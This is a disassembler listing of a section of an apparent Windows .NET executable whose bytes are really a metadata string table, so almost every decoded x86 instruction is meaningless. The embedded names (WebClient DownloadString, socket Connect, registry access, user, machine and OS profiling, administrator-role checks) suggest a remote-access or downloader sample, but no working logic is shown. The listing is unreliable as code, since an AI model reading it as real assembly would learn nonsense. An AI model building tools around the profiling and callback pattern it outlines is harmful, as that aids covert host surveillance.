  408b2e:	6e                   	outsb  %ds:(%esi),(%dx)
  408b2f:	00 50 61             	add    %dl,0x61(%eax)
  408b32:	74 68                	je     0x408b9c
  408b34:	00 47 65             	add    %al,0x65(%edi)
  408b37:	74 46                	je     0x408b7f
  408b39:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408b40:	57 
  408b41:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408b48:	78 
  408b49:	74 65                	je     0x408bb0
  408b4b:	6e                   	outsb  %ds:(%esi),(%dx)
  408b4c:	73 69                	jae    0x408bb7
  408b4e:	6f                   	outsl  %ds:(%esi),(%dx)
  408b4f:	6e                   	outsb  %ds:(%esi),(%dx)
  408b50:	00 73 65             	add    %dh,0x65(%ebx)
  408b53:	74 5f                	je     0x408bb4
  408b55:	41                   	inc    %ecx
  408b56:	72 67                	jb     0x408bbf
  408b58:	75 6d                	jne    0x408bc7
  408b5a:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b5c:	74 73                	je     0x408bd1
  408b5e:	00 53 74             	add    %dl,0x74(%ebx)
  408b61:	61                   	popa
  408b62:	72 74                	jb     0x408bd8
  408b64:	00 57 61             	add    %dl,0x61(%edi)
  408b67:	69 74 46 6f 72 45 78 	imul   $0x69784572,0x6f(%esi,%eax,2),%esi
  408b6e:	69 
  408b6f:	74 00                	je     0x408b71
  408b71:	53                   	push   %ebx
  408b72:	65 72 76             	gs jb  0x408beb
  408b75:	65 72 43             	gs jb  0x408bbb
  408b78:	6f                   	outsl  %ds:(%esi),(%dx)
  408b79:	6d                   	insl   (%dx),%es:(%edi)
  408b7a:	70 75                	jo     0x408bf1
  408b7c:	74 65                	je     0x408be3
  408b7e:	72 00                	jb     0x408b80
  408b80:	4d                   	dec    %ebp
  408b81:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b88:	74 2e                	je     0x408bb8
  408b8a:	56                   	push   %esi
  408b8b:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408b92:	73 69                	jae    0x408bfd
  408b94:	63 2e                	arpl   %ebp,(%esi)
  408b96:	4d                   	dec    %ebp
  408b97:	79 53                	jns    0x408bec
  408b99:	65 72 76             	gs jb  0x408c12
  408b9c:	69 63 65 73 00 52 65 	imul   $0x65520073,0x65(%ebx),%esp
  408ba3:	67 69 73 74 72 79 50 	imul   $0x72507972,0x74(%bp,%di),%esi
  408baa:	72 
  408bab:	6f                   	outsl  %ds:(%esi),(%dx)
  408bac:	78 79                	js     0x408c27
  408bae:	00 67 65             	add    %ah,0x65(%edi)
  408bb1:	74 5f                	je     0x408c12
  408bb3:	52                   	push   %edx
  408bb4:	65 67 69 73 74 72 79 	imul   $0x52007972,%gs:0x74(%bp,%di),%esi
  408bbb:	00 52 
  408bbd:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408bc4:	4b 65 
  408bc6:	79 00                	jns    0x408bc8
  408bc8:	67 65 74 5f          	addr16 gs je 0x408c2b
  408bcc:	43                   	inc    %ebx
  408bcd:	75 72                	jne    0x408c41
  408bcf:	72 65                	jb     0x408c36
  408bd1:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd2:	74 55                	je     0x408c29
  408bd4:	73 65                	jae    0x408c3b
  408bd6:	72 00                	jb     0x408bd8
  408bd8:	4f                   	dec    %edi
  408bd9:	70 65                	jo     0x408c40
  408bdb:	6e                   	outsb  %ds:(%esi),(%dx)
  408bdc:	53                   	push   %ebx
  408bdd:	75 62                	jne    0x408c41
  408bdf:	4b                   	dec    %ebx
  408be0:	65 79 00             	gs jns 0x408be3
  408be3:	53                   	push   %ebx
  408be4:	70 65                	jo     0x408c4b
  408be6:	63 69 61             	arpl   %ebp,0x61(%ecx)
  408be9:	6c                   	insb   (%dx),%es:(%edi)
  408bea:	46                   	inc    %esi
  408beb:	6f                   	outsl  %ds:(%esi),(%dx)
  408bec:	6c                   	insb   (%dx),%es:(%edi)
  408bed:	64 65 72 00          	fs gs jb 0x408bf1
  408bf1:	47                   	inc    %edi
  408bf2:	65 74 46             	gs je  0x408c3b
  408bf5:	6f                   	outsl  %ds:(%esi),(%dx)
  408bf6:	6c                   	insb   (%dx),%es:(%edi)
  408bf7:	64 65 72 50          	fs gs jb 0x408c4b
  408bfb:	61                   	popa
  408bfc:	74 68                	je     0x408c66
  408bfe:	00 43 72             	add    %al,0x72(%ebx)
  408c01:	65 61                	gs popa
  408c03:	74 65                	je     0x408c6a
  408c05:	4f                   	dec    %edi
  408c06:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c09:	63 74 00 42          	arpl   %esi,0x42(%eax,%eax,1)
  408c0d:	6f                   	outsl  %ds:(%esi),(%dx)
  408c0e:	6f                   	outsl  %ds:(%esi),(%dx)
  408c0f:	6c                   	insb   (%dx),%es:(%edi)
  408c10:	65 61                	gs popa
  408c12:	6e                   	outsb  %ds:(%esi),(%dx)
  408c13:	00 4e 65             	add    %cl,0x65(%esi)
  408c16:	77 4c                	ja     0x408c64
  408c18:	61                   	popa
  408c19:	74 65                	je     0x408c80
  408c1b:	42                   	inc    %edx
  408c1c:	69 6e 64 69 6e 67 00 	imul   $0x676e69,0x64(%esi),%ebp
  408c23:	4c                   	dec    %esp
  408c24:	61                   	popa
  408c25:	74 65                	je     0x408c8c
  408c27:	47                   	inc    %edi
  408c28:	65 74 00             	gs je  0x408c2b
  408c2b:	43                   	inc    %ebx
  408c2c:	68 61 6e 67 65       	push   $0x65676e61
  408c31:	54                   	push   %esp
  408c32:	79 70                	jns    0x408ca4
  408c34:	65 00 4c 61 74       	add    %cl,%gs:0x74(%ecx,%eiz,2)
  408c39:	65 53                	gs push %ebx
  408c3b:	65 74 43             	gs je  0x408c81
  408c3e:	6f                   	outsl  %ds:(%esi),(%dx)
  408c3f:	6d                   	insl   (%dx),%es:(%edi)
  408c40:	70 6c                	jo     0x408cae
  408c42:	65 78 00             	gs js  0x408c45
  408c45:	4c                   	dec    %esp
  408c46:	61                   	popa
  408c47:	74 65                	je     0x408cae
  408c49:	43                   	inc    %ebx
  408c4a:	61                   	popa
  408c4b:	6c                   	insb   (%dx),%es:(%edi)
  408c4c:	6c                   	insb   (%dx),%es:(%edi)
  408c4d:	00 46 69             	add    %al,0x69(%esi)
  408c50:	6c                   	insb   (%dx),%es:(%edi)
  408c51:	65 4d                	gs dec %ebp
  408c53:	6f                   	outsl  %ds:(%esi),(%dx)
  408c54:	64 65 00 54 68 72    	fs add %dl,%gs:0x72(%eax,%ebp,2)
  408c5a:	65 61                	gs popa
  408c5c:	64 53                	fs push %ebx
  408c5e:	74 61                	je     0x408cc1
  408c60:	72 74                	jb     0x408cd6
  408c62:	00 4a 6f             	add    %cl,0x6f(%edx)
  408c65:	69 6e 00 73 65 74 5f 	imul   $0x5f746573,0x0(%esi),%ebp
  408c6c:	46                   	inc    %esi
  408c6d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408c74:	00 
  408c75:	47                   	inc    %edi
  408c76:	65 74 43             	gs je  0x408cbc
  408c79:	75 72                	jne    0x408ced
  408c7b:	72 65                	jb     0x408ce2
  408c7d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c7e:	74 50                	je     0x408cd0
  408c80:	72 6f                	jb     0x408cf1
  408c82:	63 65 73             	arpl   %esp,0x73(%ebp)
  408c85:	73 00                	jae    0x408c87
  408c87:	50                   	push   %eax
  408c88:	72 6f                	jb     0x408cf9
  408c8a:	63 65 73             	arpl   %esp,0x73(%ebp)
  408c8d:	73 4d                	jae    0x408cdc
  408c8f:	6f                   	outsl  %ds:(%esi),(%dx)
  408c90:	64 75 6c             	fs jne 0x408cff
  408c93:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408c97:	74 5f                	je     0x408cf8
  408c99:	4d                   	dec    %ebp
  408c9a:	61                   	popa
  408c9b:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  408ca2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408ca6:	74 5f                	je     0x408d07
  408ca8:	4d                   	dec    %ebp
  408ca9:	6f                   	outsl  %ds:(%esi),(%dx)
  408caa:	64 75 6c             	fs jne 0x408d19
  408cad:	65 4e                	gs dec %esi
  408caf:	61                   	popa
  408cb0:	6d                   	insl   (%dx),%es:(%edi)
  408cb1:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408cb5:	74 46                	je     0x408cfd
  408cb7:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408cbe:	00 
  408cbf:	46                   	inc    %esi
  408cc0:	61                   	popa
  408cc1:	69 6c 46 61 73 74 00 	imul   $0x53007473,0x61(%esi,%eax,2),%ebp
  408cc8:	53 
  408cc9:	79 73                	jns    0x408d3e
  408ccb:	74 65                	je     0x408d32
  408ccd:	6d                   	insl   (%dx),%es:(%edi)
  408cce:	2e 4e                	cs dec %esi
  408cd0:	65 74 00             	gs je  0x408cd3
  408cd3:	57                   	push   %edi
  408cd4:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  408cd8:	69 65 6e 74 00 44 6f 	imul   $0x6f440074,0x6e(%ebp),%esp
  408cdf:	77 6e                	ja     0x408d4f
  408ce1:	6c                   	insb   (%dx),%es:(%edi)
  408ce2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ce3:	61                   	popa
  408ce4:	64 53                	fs push %ebx
  408ce6:	74 72                	je     0x408d5a
  408ce8:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%esi),%ebp
  408cef:	74 61                	je     0x408d52
  408cf1:	69 6e 73 00 43 6f 6d 	imul   $0x6d6f4300,0x73(%esi),%ebp
  408cf8:	70 75                	jo     0x408d6f
  408cfa:	74 65                	je     0x408d61
  408cfc:	72 49                	jb     0x408d47
  408cfe:	6e                   	outsb  %ds:(%esi),(%dx)
  408cff:	66 6f                	outsw  %ds:(%esi),(%dx)
  408d01:	00 67 65             	add    %ah,0x65(%edi)
  408d04:	74 5f                	je     0x408d65
  408d06:	4f                   	dec    %edi
  408d07:	53                   	push   %ebx
  408d08:	46                   	inc    %esi
  408d09:	75 6c                	jne    0x408d77
  408d0b:	6c                   	insb   (%dx),%es:(%edi)
  408d0c:	4e                   	dec    %esi
  408d0d:	61                   	popa
  408d0e:	6d                   	insl   (%dx),%es:(%edi)
  408d0f:	65 00 54 6f 4c       	add    %dl,%gs:0x4c(%edi,%ebp,2)
  408d14:	6f                   	outsl  %ds:(%esi),(%dx)
  408d15:	77 65                	ja     0x408d7c
  408d17:	72 00                	jb     0x408d19
  408d19:	53                   	push   %ebx
  408d1a:	79 73                	jns    0x408d8f
  408d1c:	74 65                	je     0x408d83
  408d1e:	6d                   	insl   (%dx),%es:(%edi)
  408d1f:	2e 43                	cs inc %ebx
  408d21:	6f                   	outsl  %ds:(%esi),(%dx)
  408d22:	6c                   	insb   (%dx),%es:(%edi)
  408d23:	6c                   	insb   (%dx),%es:(%edi)
  408d24:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408d29:	6e                   	outsb  %ds:(%esi),(%dx)
  408d2a:	73 00                	jae    0x408d2c
  408d2c:	49                   	dec    %ecx
  408d2d:	45                   	inc    %ebp
  408d2e:	6e                   	outsb  %ds:(%esi),(%dx)
  408d2f:	75 6d                	jne    0x408d9e
  408d31:	65 72 61             	gs jb  0x408d95
  408d34:	74 6f                	je     0x408da5
  408d36:	72 00                	jb     0x408d38
  408d38:	53                   	push   %ebx
  408d39:	79 73                	jns    0x408dae
  408d3b:	74 65                	je     0x408da2
  408d3d:	6d                   	insl   (%dx),%es:(%edi)
  408d3e:	2e 4d                	cs dec %ebp
  408d40:	61                   	popa
  408d41:	6e                   	outsb  %ds:(%esi),(%dx)
  408d42:	61                   	popa
  408d43:	67 65 6d             	gs insl (%dx),%es:(%di)
  408d46:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d48:	74 00                	je     0x408d4a
  408d4a:	4d                   	dec    %ebp
  408d4b:	61                   	popa
  408d4c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d4d:	61                   	popa
  408d4e:	67 65 6d             	gs insl (%dx),%es:(%di)
  408d51:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d53:	74 4f                	je     0x408da4
  408d55:	62 6a 65             	bound  %ebp,0x65(%edx)
  408d58:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408d5c:	61                   	popa
  408d5d:	72 63                	jb     0x408dc2
  408d5f:	68 65 72 00 49       	push   $0x49007265
  408d64:	45                   	inc    %ebp
  408d65:	6e                   	outsb  %ds:(%esi),(%dx)
  408d66:	75 6d                	jne    0x408dd5
  408d68:	65 72 61             	gs jb  0x408dcc
  408d6b:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  408d6f:	47                   	inc    %edi
  408d70:	65 74 45             	gs je  0x408db8
  408d73:	6e                   	outsb  %ds:(%esi),(%dx)
  408d74:	75 6d                	jne    0x408de3
  408d76:	65 72 61             	gs jb  0x408dda
  408d79:	74 6f                	je     0x408dea
  408d7b:	72 00                	jb     0x408d7d
  408d7d:	67 65 74 5f          	addr16 gs je 0x408de0
  408d81:	43                   	inc    %ebx
  408d82:	75 72                	jne    0x408df6
  408d84:	72 65                	jb     0x408deb
  408d86:	6e                   	outsb  %ds:(%esi),(%dx)
  408d87:	74 00                	je     0x408d89
  408d89:	4c                   	dec    %esp
  408d8a:	61                   	popa
  408d8b:	74 65                	je     0x408df2
  408d8d:	49                   	dec    %ecx
  408d8e:	6e                   	outsb  %ds:(%esi),(%dx)
  408d8f:	64 65 78 47          	fs gs js 0x408dda
  408d93:	65 74 00             	gs je  0x408d96
  408d96:	4f                   	dec    %edi
  408d97:	70 65                	jo     0x408dfe
  408d99:	72 61                	jb     0x408dfc
  408d9b:	74 6f                	je     0x408e0c
  408d9d:	72 73                	jb     0x408e12
  408d9f:	00 43 6f             	add    %al,0x6f(%ebx)
  408da2:	6d                   	insl   (%dx),%es:(%edi)
  408da3:	70 61                	jo     0x408e06
  408da5:	72 65                	jb     0x408e0c
  408da7:	53                   	push   %ebx
  408da8:	74 72                	je     0x408e1c
  408daa:	69 6e 67 00 54 6f 55 	imul   $0x556f5400,0x67(%esi),%ebp
  408db1:	70 70                	jo     0x408e23
  408db3:	65 72 49             	gs jb  0x408dff
  408db6:	6e                   	outsb  %ds:(%esi),(%dx)
  408db7:	76 61                	jbe    0x408e1a
  408db9:	72 69                	jb     0x408e24
  408dbb:	61                   	popa
  408dbc:	6e                   	outsb  %ds:(%esi),(%dx)
  408dbd:	74 00                	je     0x408dbf
  408dbf:	4d                   	dec    %ebp
  408dc0:	6f                   	outsl  %ds:(%esi),(%dx)
  408dc1:	76 65                	jbe    0x408e28
  408dc3:	4e                   	dec    %esi
  408dc4:	65 78 74             	gs js  0x408e3b
  408dc7:	00 49 44             	add    %cl,0x44(%ecx)
  408dca:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  408dd1:	6c                   	insb   (%dx),%es:(%edi)
  408dd2:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  408dd7:	70 6f                	jo     0x408e48
  408dd9:	73 65                	jae    0x408e40
  408ddb:	00 67 65             	add    %ah,0x65(%edi)
  408dde:	74 5f                	je     0x408e3f
  408de0:	48                   	dec    %eax
  408de1:	61                   	popa
  408de2:	6e                   	outsb  %ds:(%esi),(%dx)
  408de3:	64 6c                	fs insb (%dx),%es:(%edi)
  408de5:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  408de9:	74 50                	je     0x408e3b
  408deb:	74 72                	je     0x408e5f
  408ded:	00 54 6f 49          	add    %dl,0x49(%edi,%ebp,2)
  408df1:	6e                   	outsb  %ds:(%esi),(%dx)
  408df2:	74 33                	je     0x408e27
  408df4:	32 00                	xor    (%eax),%al
  408df6:	4e                   	dec    %esi
  408df7:	65 78 74             	gs js  0x408e6e
  408dfa:	00 57 61             	add    %dl,0x61(%edi)
  408dfd:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408e04:	65 
  408e05:	00 57 61             	add    %dl,0x61(%edi)
  408e08:	69 74 4f 6e 65 00 53 	imul   $0x54530065,0x6e(%edi,%ecx,2),%esi
  408e0f:	54 
  408e10:	41                   	inc    %ecx
  408e11:	54                   	push   %esp
  408e12:	68 72 65 61 64       	push   $0x64616572
  408e17:	41                   	inc    %ecx
  408e18:	74 74                	je     0x408e8e
  408e1a:	72 69                	jb     0x408e85
  408e1c:	62 75 74             	bound  %esi,0x74(%ebp)
  408e1f:	65 00 44 6c 6c       	add    %al,%gs:0x6c(%esp,%ebp,2)
  408e24:	49                   	dec    %ecx
  408e25:	6d                   	insl   (%dx),%es:(%edi)
  408e26:	70 6f                	jo     0x408e97
  408e28:	72 74                	jb     0x408e9e
  408e2a:	41                   	inc    %ecx
  408e2b:	74 74                	je     0x408ea1
  408e2d:	72 69                	jb     0x408e98
  408e2f:	62 75 74             	bound  %esi,0x74(%ebp)
  408e32:	65 00 6b 65          	add    %ch,%gs:0x65(%ebx)
  408e36:	72 6e                	jb     0x408ea6
  408e38:	65 6c                	gs insb (%dx),%es:(%edi)
  408e3a:	33 32                	xor    (%edx),%esi
  408e3c:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408e3f:	6c                   	insb   (%dx),%es:(%edi)
  408e40:	00 5f 4c             	add    %bl,0x4c(%edi)
  408e43:	61                   	popa
  408e44:	6d                   	insl   (%dx),%es:(%edi)
  408e45:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  408e49:	5f                   	pop    %edi
  408e4a:	5f                   	pop    %edi
  408e4b:	34 00                	xor    $0x0,%al
  408e4d:	61                   	popa
  408e4e:	30 00                	xor    %al,(%eax)
  408e50:	5f                   	pop    %edi
  408e51:	4c                   	dec    %esp
  408e52:	61                   	popa
  408e53:	6d                   	insl   (%dx),%es:(%edi)
  408e54:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  408e58:	5f                   	pop    %edi
  408e59:	5f                   	pop    %edi
  408e5a:	35 00 49 50 41       	xor    $0x41504900,%eax
  408e5f:	64 64 72 65          	fs fs jb 0x408ec8
  408e63:	73 73                	jae    0x408ed8
  408e65:	00 43 68             	add    %al,0x68(%ebx)
  408e68:	61                   	popa
  408e69:	72 00                	jb     0x408e6b
  408e6b:	53                   	push   %ebx
  408e6c:	70 6c                	jo     0x408eda
  408e6e:	69 74 00 44 6e 73 00 	imul   $0x4700736e,0x44(%eax,%eax,1),%esi
  408e75:	47 
  408e76:	65 74 48             	gs je  0x408ec1
  408e79:	6f                   	outsl  %ds:(%esi),(%dx)
  408e7a:	73 74                	jae    0x408ef0
  408e7c:	41                   	inc    %ecx
  408e7d:	64 64 72 65          	fs fs jb 0x408ee6
  408e81:	73 73                	jae    0x408ef6
  408e83:	65 73 00             	gs jae 0x408e86
  408e86:	54                   	push   %esp
  408e87:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408e8e:	6c                   	insb   (%dx),%es:(%edi)
  408e8f:	62 61 63             	bound  %esp,0x63(%ecx)
  408e92:	6b 00 41             	imul   $0x41,(%eax),%eax
  408e95:	64 64 72 65          	fs fs jb 0x408efe
  408e99:	73 73                	jae    0x408f0e
  408e9b:	46                   	inc    %esi
  408e9c:	61                   	popa
  408e9d:	6d                   	insl   (%dx),%es:(%edi)
  408e9e:	69 6c 79 00 53 6f 63 	imul   $0x6b636f53,0x0(%ecx,%edi,2),%ebp
  408ea5:	6b 
  408ea6:	65 74 54             	gs je  0x408efd
  408ea9:	79 70                	jns    0x408f1b
  408eab:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408eaf:	6f                   	outsl  %ds:(%esi),(%dx)
  408eb0:	74 6f                	je     0x408f21
  408eb2:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408eb5:	54                   	push   %esp
  408eb6:	79 70                	jns    0x408f28
  408eb8:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  408ebc:	74 65                	je     0x408f23
  408ebe:	00 73 65             	add    %dh,0x65(%ebx)
  408ec1:	74 5f                	je     0x408f22
  408ec3:	52                   	push   %edx
  408ec4:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408ec8:	76 65                	jbe    0x408f2f
  408eca:	42                   	inc    %edx
  408ecb:	75 66                	jne    0x408f33
  408ecd:	66 65 72 53          	data16 gs jb 0x408f24
  408ed1:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408ed8:	5f                   	pop    %edi
  408ed9:	53                   	push   %ebx
  408eda:	65 6e                	outsb  %gs:(%esi),(%dx)
  408edc:	64 42                	fs inc %edx
  408ede:	75 66                	jne    0x408f46
  408ee0:	66 65 72 53          	data16 gs jb 0x408f37
  408ee4:	69 7a 65 00 43 6f 6e 	imul   $0x6e6f4300,0x65(%edx),%edi
  408eeb:	6e                   	outsb  %ds:(%esi),(%dx)
  408eec:	65 63 74 00 53       	arpl   %esi,%gs:0x53(%eax,%eax,1)
  408ef1:	6f                   	outsl  %ds:(%esi),(%dx)
  408ef2:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408ef5:	74 46                	je     0x408f3d
  408ef7:	6c                   	insb   (%dx),%es:(%edi)
  408ef8:	61                   	popa
  408ef9:	67 73 00             	addr16 jae 0x408efc
  408efc:	45                   	inc    %ebp
  408efd:	76 65                	jbe    0x408f64
  408eff:	6e                   	outsb  %ds:(%esi),(%dx)
  408f00:	74 57                	je     0x408f59
  408f02:	61                   	popa
  408f03:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408f0a:	65 
  408f0b:	00 53 65             	add    %dl,0x65(%ebx)
  408f0e:	74 00                	je     0x408f10
  408f10:	67 65 74 5f          	addr16 gs je 0x408f73
  408f14:	55                   	push   %ebp
  408f15:	73 65                	jae    0x408f7c
  408f17:	72 4e                	jb     0x408f67
  408f19:	61                   	popa
  408f1a:	6d                   	insl   (%dx),%es:(%edi)
  408f1b:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408f1f:	70 6c                	jo     0x408f8d
  408f21:	61                   	popa
  408f22:	63 65 00             	arpl   %esp,0x0(%ebp)
  408f25:	4f                   	dec    %edi
  408f26:	70 65                	jo     0x408f8d
  408f28:	72 61                	jb     0x408f8b
  408f2a:	74 69                	je     0x408f95
  408f2c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f2d:	67 53                	addr16 push %ebx
  408f2f:	79 73                	jns    0x408fa4
  408f31:	74 65                	je     0x408f98
  408f33:	6d                   	insl   (%dx),%es:(%edi)
  408f34:	00 67 65             	add    %ah,0x65(%edi)
  408f37:	74 5f                	je     0x408f98
  408f39:	4f                   	dec    %edi
  408f3a:	53                   	push   %ebx
  408f3b:	56                   	push   %esi
  408f3c:	65 72 73             	gs jb  0x408fb2
  408f3f:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  408f46:	5f                   	pop    %edi
  408f47:	53                   	push   %ebx
  408f48:	65 72 76             	gs jb  0x408fc1
  408f4b:	69 63 65 50 61 63 6b 	imul   $0x6b636150,0x65(%ebx),%esp
  408f52:	00 67 65             	add    %ah,0x65(%edi)
  408f55:	74 5f                	je     0x408fb6
  408f57:	49                   	dec    %ecx
  408f58:	73 36                	jae    0x408f90
  408f5a:	34 42                	xor    $0x42,%al
  408f5c:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408f63:	74 
  408f64:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408f6b:	65 6d                	gs insl (%dx),%es:(%edi)
  408f6d:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  408f71:	65 54                	gs push %esp
  408f73:	69 6d 65 00 46 69 6c 	imul   $0x6c694600,0x65(%ebp),%ebp
  408f7a:	65 53                	gs push %ebx
  408f7c:	79 73                	jns    0x408ff1
  408f7e:	74 65                	je     0x408fe5
  408f80:	6d                   	insl   (%dx),%es:(%edi)
  408f81:	49                   	dec    %ecx
  408f82:	6e                   	outsb  %ds:(%esi),(%dx)
  408f83:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f85:	00 67 65             	add    %ah,0x65(%edi)
  408f88:	74 5f                	je     0x408fe9
  408f8a:	4c                   	dec    %esp
  408f8b:	61                   	popa
  408f8c:	73 74                	jae    0x409002
  408f8e:	57                   	push   %edi
  408f8f:	72 69                	jb     0x408ffa
  408f91:	74 65                	je     0x408ff8
  408f93:	54                   	push   %esp
  408f94:	69 6d 65 00 53 79 73 	imul   $0x73795300,0x65(%ebp),%ebp
  408f9b:	74 65                	je     0x409002
  408f9d:	6d                   	insl   (%dx),%es:(%edi)
  408f9e:	2e 53                	cs push %ebx
  408fa0:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408fa4:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408fab:	6e 
  408fac:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408faf:	61                   	popa
  408fb0:	6c                   	insb   (%dx),%es:(%edi)
  408fb1:	00 57 69             	add    %dl,0x69(%edi)
  408fb4:	6e                   	outsb  %ds:(%esi),(%dx)
  408fb5:	64 6f                	outsl  %fs:(%esi),(%dx)
  408fb7:	77 73                	ja     0x40902c
  408fb9:	49                   	dec    %ecx
  408fba:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408fbd:	74 69                	je     0x409028
  408fbf:	74 79                	je     0x40903a
  408fc1:	00 47 65             	add    %al,0x65(%edi)
  408fc4:	74 43                	je     0x409009
  408fc6:	75 72                	jne    0x40903a
  408fc8:	72 65                	jb     0x40902f
  408fca:	6e                   	outsb  %ds:(%esi),(%dx)
  408fcb:	74 00                	je     0x408fcd
  408fcd:	57                   	push   %edi
  408fce:	69 6e 64 6f 77 73 50 	imul   $0x5073776f,0x64(%esi),%ebp
  408fd5:	72 69                	jb     0x409040
  408fd7:	6e                   	outsb  %ds:(%esi),(%dx)
  408fd8:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408fdb:	61                   	popa
  408fdc:	6c                   	insb   (%dx),%es:(%edi)
  408fdd:	00 57 69             	add    %dl,0x69(%edi)
  408fe0:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe1:	64 6f                	outsl  %fs:(%esi),(%dx)
  408fe3:	77 73                	ja     0x409058
  408fe5:	42                   	inc    %edx
  408fe6:	75 69                	jne    0x409051
  408fe8:	6c                   	insb   (%dx),%es:(%edi)
  408fe9:	74 49                	je     0x409034
  408feb:	6e                   	outsb  %ds:(%esi),(%dx)
  408fec:	52                   	push   %edx
  408fed:	6f                   	outsl  %ds:(%esi),(%dx)
  408fee:	6c                   	insb   (%dx),%es:(%edi)
  408fef:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  408ff3:	49                   	dec    %ecx
  408ff4:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff5:	52                   	push   %edx
  408ff6:	6f                   	outsl  %ds:(%esi),(%dx)
  408ff7:	6c                   	insb   (%dx),%es:(%edi)
  408ff8:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  408ffc:	6e                   	outsb  %ds:(%esi),(%dx)
  408ffd:	61                   	popa
  408ffe:	67 65 6d             	gs insl (%dx),%es:(%di)
  409001:	65 6e                	outsb  %gs:(%esi),(%dx)
  409003:	74 42                	je     0x409047
  409005:	61                   	popa
  409006:	73 65                	jae    0x40906d
  409008:	4f                   	dec    %edi
  409009:	62 6a 65             	bound  %ebp,0x65(%edx)
  40900c:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409010:	61                   	popa
  409011:	6e                   	outsb  %ds:(%esi),(%dx)
  409012:	61                   	popa
  409013:	67 65 6d             	gs insl (%dx),%es:(%di)
  409016:	65 6e                	outsb  %gs:(%esi),(%dx)
  409018:	74 4f                	je     0x409069
  40901a:	62 6a 65             	bound  %ebp,0x65(%edx)
  40901d:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  409021:	6c                   	insb   (%dx),%es:(%edi)
  409022:	6c                   	insb   (%dx),%es:(%edi)
  409023:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409028:	6e                   	outsb  %ds:(%esi),(%dx)
  409029:	00 4d 61             	add    %cl,0x61(%ebp)
  40902c:	6e                   	outsb  %ds:(%esi),(%dx)
  40902d:	61                   	popa
  40902e:	67 65 6d             	gs insl (%dx),%es:(%di)
  409031:	65 6e                	outsb  %gs:(%esi),(%dx)
  409033:	74 4f                	je     0x409084
  409035:	62 6a 65             	bound  %ebp,0x65(%edx)
  409038:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  40903c:	75 6d                	jne    0x4090ab
  40903e:	65 72 61             	gs jb  0x4090a2
  409041:	74 6f                	je     0x4090b2
  409043:	72 00                	jb     0x409045
  409045:	67 65 74 5f          	addr16 gs je 0x4090a8
  409049:	4d                   	dec    %ebp
  40904a:	61                   	popa
  40904b:	63 68 69             	arpl   %ebp,0x69(%eax)
  40904e:	6e                   	outsb  %ds:(%esi),(%dx)
  40904f:	65 4e                	gs dec %esi
  409051:	61                   	popa
  409052:	6d                   	insl   (%dx),%es:(%edi)
  409053:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  409057:	74 00                	je     0x409059
